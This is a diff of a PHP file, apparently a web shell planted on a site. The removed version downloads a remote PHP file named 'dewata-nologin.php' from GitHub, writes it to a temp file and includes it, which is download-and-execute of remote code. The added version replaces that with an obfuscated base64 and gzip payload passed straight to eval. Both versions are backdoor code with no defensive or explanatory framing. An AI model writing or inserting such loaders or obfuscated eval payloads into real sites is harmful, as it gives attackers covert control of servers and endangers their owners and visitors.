@@ -1,50 +1,6 @@
 <?php
-// Enable error reporting for debugging purposes
-error_reporting(E_ALL);
-ini_set('display_errors', 1);
-
-function geturlsinfo($url) {
-    if (function_exists('curl_exec')) {
-        $conn = curl_init($url);
-        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
-        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
-        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
-        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
-        $url_get_contents_data = curl_exec($conn);
-        if (curl_errno($conn)) {
-            echo 'Curl error: ' . curl_error($conn);
-            return false;
-        }
-        curl_close($conn);
-    } elseif (function_exists('file_get_contents')) {
-        $url_get_contents_data = file_get_contents($url);
-        if ($url_get_contents_data === false) {
-            echo 'file_get_contents error';
-            return false;
-        }
-    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
-        $handle = fopen($url, "r");
-        if ($handle === false) {
-            echo 'fopen error';
-            return false;
-        }
-        $url_get_contents_data = stream_get_contents($handle);
-        fclose($handle);
-    } else {
-        $url_get_contents_data = false;
-    }
-    return $url_get_contents_data;
-}
-
-// Directly execute the main content
-$a = geturlsinfo('https://raw.githubusercontent.com/AyanaEx/External/main/dewata-nologin.php');
-if ($a !== false) {
-    $tmp_file = sys_get_temp_dir() . '/temp_' . uniqid() . '.php';
-    file_put_contents($tmp_file, $a);
-    include($tmp_file);
-    // Do not delete the temporary file
-} else {
-    echo "Failed to retrieve content.";
-}
+$NoLogin = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
+$Lix = "\x3d8o\x61veryj\x42ghjvl1\x42LPVr42\x436v9ZJDMLr6Fp12IeTVQqo\x43SpNkkmV3SF\x611Zz\x61d/\x43tIZZqMHIKdsKfQvKQgSjY0\x41YPoY\x63kL5KqZ9W\x431\x2beQtytKmjGoQvr4pF/0qqfiO2dzt1Fjz6Lje\x62MUd\x629\x43ISRknL\x61RrD\x61RZTLoSd\x618SSoN1\x63MOpw/n27JqOnQ7off\x62U8PL149yM\x43I\x43FM\x2bYJDJlON\x2bdn\x41eiwqjj9mjxmyWGL/ZfPU8RsQWUP32R0\x63ttZoKEQVjEuGE\x41F\x62T5K4Xi\x63ir6/G5PJ1Uz0rNKmm\x2bKuqitqI2O97\x62UQ\x61XYqGrQvD\x61OSKSeWoY4T6/N\x62suXxvN\x2bi\x631s2e3JJynMy\x426QqHpS\x61dTFZe5M\x63\x42G\x61Yx\x2b41\x42OQ2YNUyriVd\x2bJSNvh\x61\x61Eez7iP/\x63UPnTjpNiINiMn33/\x42JdesKl9MZzrJg39QXf7Wumk5R7\x436t\x63YOT\x42O\x42NMn1rTn1R\x61OIwwNkxs5q2XgTKsiZWmmy3K\x41NjmJx1Txx23pUnM1RdQWKT8E\x42IHVDDVQdOR45IJP\x2bhfn3qensJG4pvN3FGlgfejf8QPvGY3IM6MHDTDnu\x2b7VP6/Q93TK\x4241tOw\x2bjff2JwPXPK4Mh\x42\x63eTZk\x63d/\x41XP4/L5JV/\x43\x61/o1lJMkheoFsxOP/\x2bH0\x41XdGDe8lf4zfeD\x62Gs7hUFGsE/gmyIm0wG5\x42fU\x436gHfRP7iF29YxQK\x61QiegFNY0XL9iHet\x41GiDEUei\x61N3g70JOYeXItJdN\x63\x63\x42FuFu1W\x42W5L\x41Z7xwrz3te\x62USu\x43nzGhQwW\x43Fik0ir0Wg\x2bW405y\x43LyUuy8U1J\x63h\x435qIilZzx7\x2bQX4G\x63\x2b\x6241Vh\x6252RosYMFldlr\x61s3p\x63np\x42lFFmEFGgJDjkRw\x63vJi\x41fwntIvORd6zX7477dePfi7hVl\x42mEQ/Rnf\x2bn40V\x62rukUng\x61Hzsn4epyQpK\x61qh\x62Fl\x61Y\x41\x63P0u\x63S1pySVZV4/T5j\x2b\x42\x42M\x62/03V1Z/HJ\x41u\x42wJe9zj\x41DHQ/3I\x41y\x42wJe9zi\x41THQ/nI\x412\x42wJe9zh\x41jHQ/XI\x416\x42wJe";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($NoLogin))));
+exit;
 ?>
